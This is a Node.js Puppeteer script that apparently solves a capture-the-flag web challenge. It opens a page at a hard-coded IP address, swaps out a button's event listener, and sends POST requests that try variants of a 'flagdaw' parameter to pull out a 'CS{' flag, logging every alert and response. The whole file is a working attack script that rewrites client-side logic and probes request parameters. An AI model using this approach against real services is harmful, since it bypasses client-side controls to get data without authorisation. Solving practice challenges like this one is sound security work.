const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  
  page.on('dialog', async dialog => {
    const message = dialog.message();
    console.log('ALERT:', message);
    if (message.includes('CS{')) {
      console.log('*** FLAG FOUND ***');
    }
    await dialog.accept();
  });
  
  try {
    await page.goto('http://49.213.52.6:6969/');
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Modify the page to use flagdaw instead of flagDaw
    await page.evaluate(() => {
      const button = document.getElementById('button');
      // Remove old listener and add new one
      button.replaceWith(button.cloneNode(true));
      const newButton = document.getElementById('button');
      newButton.addEventListener('click', async () => {
        const flag = await fetch('/', {
          method: 'POST',
          body: JSON.stringify({ flagdaw: true }),
        }).then((r) => r.text());
        alert(flag);
      });
    });
    
    await page.click('#button');
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // Also try with different variations
    const responses = await page.evaluate(async () => {
      const results = {};
      
      // Try flagdaw with different values
      for (const val of [true, 1, "true"]) {
        const res = await fetch('/', {
          method: 'POST',
          body: JSON.stringify({ flagdaw: val }),
        });
        results[`flagdaw=${val}`] = await res.text();
      }
      
      return results;
    });
    
    console.log('\nAll responses:', JSON.stringify(responses, null, 2));
    
  } catch (error) {
    console.error('Error:', error);
  } finally {
    await browser.close();
  }
})();

